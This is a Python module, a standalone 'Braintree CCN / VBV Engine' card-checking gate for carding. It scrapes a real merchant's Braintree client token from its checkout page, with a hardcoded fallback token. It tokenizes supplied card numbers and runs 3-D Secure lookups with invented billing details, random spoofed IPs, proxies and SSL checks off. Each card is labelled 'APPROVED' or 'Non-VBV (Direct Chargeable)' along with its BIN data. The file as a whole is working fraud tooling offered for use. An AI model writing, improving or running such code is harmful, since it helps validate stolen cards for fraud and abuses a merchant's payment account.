"""
Braintree CCN / VBV Engine - Standalone Gate Module
"""
import aiohttp
import re
import json
import base64
import random
import asyncio
import time

# Fallback persistent token (auto-refreshed dynamically)
_FALLBACK_FINGERPRINT = (
    "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0."
    "eyJleHAiOjE3ODc4NDA2NjksImp0aSI6Ijc5ZDJlYWY2LTE1Y2QtNGIxNC04NWExLWVkZjQ5OTI3ZDNhOSIsInN1YiI6IjVoZ3pxZ3BjbmRuM2ZzNHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjVoZ3pxZ3BjbmRuM2ZzNHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImluZm9tYWtpc3RhbXBzZGUiLCJwYXlwYWxfY2xpZW50X2lkIjoiQWZJM3ZaUTBFZmVVTGZxRElEQlZGNGY4eDh5aUVHV3Z3a0hnYm1CYi1Vclo5Y19sMGhOb2FaNTB4eXpEUDA0ZEdEU0RLYmJUcEc3Q0xwLVoifX0."
    "nOQOSLk7iVujeq2TDRaFDVKrrzaqZIaD_pG984zT_KsaIkz6C7wZxqbKHwu0DUje6g0_-FU6bq41WYNRVwcl4g"
)

_cached_fingerprint = _FALLBACK_FINGERPRINT
_cache_expiry = time.time() + 43200

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_fp_from_text(text: str) -> str | None:
    if not text:
        return None
    match = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', text)
    if match:
        try:
            decoded = base64.b64decode(match.group(1)).decode()
            data = json.loads(decoded)
            fp = data.get("authorizationFingerprint")
            if fp:
                return fp
        except Exception:
            pass
    match2 = re.search(r'\"authorizationFingerprint\"\s*:\s*\"([^\"]+)\"', text)
    if match2:
        return match2.group(1)
    return None

async def _get_auth_fingerprint(session, proxy_url=None):
    """Fetch and cache the Braintree authorization fingerprint."""
    global _cached_fingerprint, _cache_expiry
    
    now = time.time()
    if _cached_fingerprint and now < _cache_expiry:
        return _cached_fingerprint
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    
    try:
        async with session.get('https://www.makistamps.com/checkout/', headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                resp_text = await r.text()
                fp = _extract_fp_from_text(resp_text)
                if fp:
                    _cached_fingerprint = fp
                    _cache_expiry = now + 43200
                    return fp
    except Exception:
        pass
    
    if proxy_url:
        try:
            async with session.get('https://www.makistamps.com/checkout/', headers=headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    resp_text = await r.text()
                    fp = _extract_fp_from_text(resp_text)
                    if fp:
                        _cached_fingerprint = fp
                        _cache_expiry = now + 43200
                        return fp
        except Exception:
            pass

    if _FALLBACK_FINGERPRINT:
        _cached_fingerprint = _FALLBACK_FINGERPRINT
        _cache_expiry = now + 43200
        return _FALLBACK_FINGERPRINT

    return None


async def check_card_brccn(cc, mm, yy, cvc, proxy_url=None):
    """
    Braintree CCN / VBV Engine.
    Returns: (is_live, message, response_text, receipt_url, amount)
    """
    proxy_url = _format_proxy(proxy_url)

    if len(yy) == 2:
        yy = "20" + yy
        
    bin_number = cc[:6]
    ipadd = f"{random.randint(11,250)}.{random.randint(11,250)}.{random.randint(11,250)}.{random.randint(11,250)}"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            
            # 1. Get cached fingerprint
            authorization_fingerprint = await _get_auth_fingerprint(session, proxy_url)
            if not authorization_fingerprint:
                return False, "Failed to get Braintree Auth Token", "", None, "Auth ($0.00)"

            # 2. Tokenize via GraphQL
            headers_gql = {
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 Chrome/149.0.7827.91 Mobile Safari/537.36',
            }
            
            json_gql = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': '2d64cb82-f1a4-4084-bdd8-63df2991eadb',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            try:
                async with session.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_gql, proxy=proxy_url) as r:
                    gql_resp = await r.json()
            except Exception:
                async with session.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_gql) as r:
                    gql_resp = await r.json()
                    
            try:
                tokencc = gql_resp["data"]["tokenizeCreditCard"]["token"]
                card_data = gql_resp["data"]["tokenizeCreditCard"].get("creditCard", {})
                bin_data = card_data.get("binData", {})
            except Exception:
                if isinstance(gql_resp, dict) and 'errors' in gql_resp:
                    err = gql_resp['errors'][0].get('message', 'GraphQL Error')
                    return False, f"Tokenize Failed: {err}", str(gql_resp), None, "Auth ($0.00)"
                return False, "Failed to tokenize card", str(gql_resp), None, "Auth ($0.00)"

            # 3. 3DS Lookup
            headers_lookup = {
                'content-type': 'application/json',
                'origin': 'https://www.makistamps.com',
                'referer': 'https://www.makistamps.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA) AppleWebKit/537.36 Chrome/149.0.7827.91 Mobile Safari/537.36',
            }
            
            json_lookup = {
                'amount': '0.00',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en-US',
                'browserScreenHeight': 965,
                'browserScreenWidth': 434,
                'browserTimeZone': -330,
                'deviceChannel': 'Browser',
                'additionalInfo': {
                    'ipAddress': ipadd,
                    'billingLine1': '123 Main Street',
                    'billingLine2': '',
                    'billingCity': 'New York',
                    'billingState': 'NY',
                    'billingPostalCode': '10001',
                    'billingCountryCode': 'US',
                    'billingPhoneNumber': '16023147676',
                    'billingGivenName': 'James',
                    'billingSurname': 'Smith',
                    'email': 'jamesmith9921@gmail.com',
                },
                'bin': bin_number,
                'dfReferenceId': '0_de6f19a7-7fbb-4b08-b3dc-49df96c87bbf',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.133.0',
                    'cardinalDeviceDataCollectionTimeElapsed': 81217,
                    'issuerDeviceDataCollectionTimeElapsed': 9785,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': authorization_fingerprint,
                'braintreeLibraryVersion': 'braintree/web/3.133.0',
                '_meta': {
                    'merchantAppId': 'www.makistamps.com',
                    'platform': 'web',
                    'sdkVersion': '3.133.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': '9668a9ca-d46a-477c-a120-d8b41523e16f',
                },
            }
            
            lookup_url = f'https://api.braintreegateway.com/merchants/5hgzqgpcndn3fs4y/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
            try:
                async with session.post(lookup_url, headers=headers_lookup, json=json_lookup, proxy=proxy_url) as r:
                    res_json = await r.json()
            except Exception:
                async with session.post(lookup_url, headers=headers_lookup, json=json_lookup) as r:
                    res_json = await r.json()

            # 4. Parse 3DS Status + BIN info
            try:
                statuscc = res_json["paymentMethod"]["threeDSecureInfo"]["status"]
                card_details = res_json.get("paymentMethod", {}).get("details", {})
                card_type = card_details.get("cardType", "Unknown")
                
                bin_info = {
                    "bin": bin_number,
                    "card_type": card_type,
                    "issuing_bank": bin_data.get("issuingBank", "Unknown"),
                    "country": bin_data.get("countryOfIssuance", "Unknown"),
                    "prepaid": bin_data.get("prepaid", "Unknown"),
                    "debit": bin_data.get("debit", "Unknown"),
                    "commercial": bin_data.get("commercial", "Unknown"),
                }
                
                if statuscc in ['authenticate_successful', 'authenticate_attempt_successful', 'authenticate_successful_issuer_not_participating']:
                    return True, "3DS Passed (Frictionless / Non-VBV)", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc in ['lookup_not_enrolled', 'lookup_bypassed']:
                    return True, "Non-VBV (Direct Chargeable)", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc in ['challenge_required', 'authenticate_rejected']:
                    return False, "3DS Challenge Required", json.dumps(bin_info), None, "Auth ($0.00)"
                elif statuscc in ['lookup_card_error', 'authenticate_failed']:
                    return False, "Card Declined by Issuer", json.dumps(bin_info), None, "Auth ($0.00)"
                else:
                    return False, f"Declined ({statuscc.replace('_', ' ').title()})", json.dumps(bin_info), None, "Auth ($0.00)"
                     
            except KeyError:
                err_msg = res_json.get('error', {}).get('message', '3DS Lookup Failed')
                if 'error' not in res_json:
                    err_msg = "3DS Lookup Failed"
                return False, err_msg, str(res_json), None, "Auth ($0.00)"
                
    except Exception as e:
        return False, f"Error: {str(e)}", "", None, "Auth ($0.00)"


# Aliases for backward compatibility
process_braintree_vbv = check_card_brccn
process_braintree_ccn = check_card_brccn


if __name__ == '__main__':
    import sys
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
    parts = test_card.split('|')
    print(f"[*] Standalone Debugging brccn.py on: {test_card}")
    is_live, msg, raw_resp, _, amt = asyncio.run(check_card_brccn(parts[0], parts[1], parts[2], parts[3]))
    print(f"[+] Status: {'APPROVED' if is_live else 'DECLINED'}")
    print(f"[+] Message: {msg}")
    print(f"[+] Details: {raw_resp}")
